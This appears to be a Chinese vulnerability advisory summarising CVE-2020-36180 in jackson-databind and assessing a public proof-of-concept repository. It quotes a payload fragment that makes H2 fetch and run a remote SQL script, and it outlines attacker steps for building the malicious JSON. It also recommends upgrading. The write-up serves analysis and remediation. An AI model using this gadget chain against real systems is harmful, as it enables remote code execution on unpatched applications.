## CVE-2020-36180 - Jackson-databind 反序列化漏洞

**漏洞编号:** CVE-2020-36180

**漏洞类型:** 反序列化漏洞

**影响应用:** FasterXML jackson-databind

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.x before 2.9.10.8

**利用条件:** 应用程序使用存在漏洞的jackson-databind版本，且允许反序列化不受信任的数据。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于FasterXML jackson-databind库中，由于不安全的反序列化操作导致。当jackson-databind 2.9.10.8之前的2.x版本处理序列化工具和类型之间的交互时，存在问题，特别是在与org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS相关的情况下。

**有效性：**
提供的POC代码有效。它使用`org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS`作为gadget，结合H2数据库的特性，通过JDBC URL执行任意SQL代码。POC通过设置`TRACE_LEVEL_SYSTEM_OUT=3`来显示执行结果，并通过`INIT=RUNSCRIPT FROM 'http://127.0.0.1:3333/exec.sql'`从远程URL执行SQL脚本，达到远程代码执行的目的。

**投毒风险：**
该仓库中的投毒风险较低 (0%)。虽然攻击者可以通过远程SQL脚本执行恶意代码，但`pom.xml`文件只包含了jackson-databind, commons-dbcp2, h2database, slf4j-nop和jta等常规依赖，并且源代码中没有发现明显的恶意代码。`POC.java`文件中的代码主要用于演示漏洞利用，没有发现其他潜在的恶意行为。

**利用方式：**
1.  攻击者需要找到一个应用程序，该应用程序使用存在漏洞的jackson-databind版本（2.x before 2.9.10.8）。
2.  攻击者需要找到该应用程序可以接受JSON格式数据并使用jackson-databind进行反序列化的入口点。
3.  攻击者构造包含恶意`org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS` gadget的JSON payload，如POC代码所示。Payload中的JDBC URL指向攻击者控制的服务器，该服务器托管包含恶意命令的SQL脚本(`exec.sql`)。
4.  应用程序反序列化恶意JSON payload时，jackson-databind会尝试创建`DriverAdapterCPDS`对象，并根据payload中的数据设置其属性，包括JDBC URL。H2数据库驱动程序在初始化时会执行URL中指定的SQL脚本，从而导致远程代码执行。

**修复建议：**
将jackson-databind升级到2.9.10.8或更高版本，或者采取其他缓解措施，例如禁用default typing，使用白名单机制限制可反序列化的类。

**项目地址:** [cuijiung/jackson-CVE-2020-36180](https://github.com/cuijiung/jackson-CVE-2020-36180)

**漏洞详情:** [CVE-2020-36180](https://nvd.nist.gov/vuln/detail/CVE-2020-36180)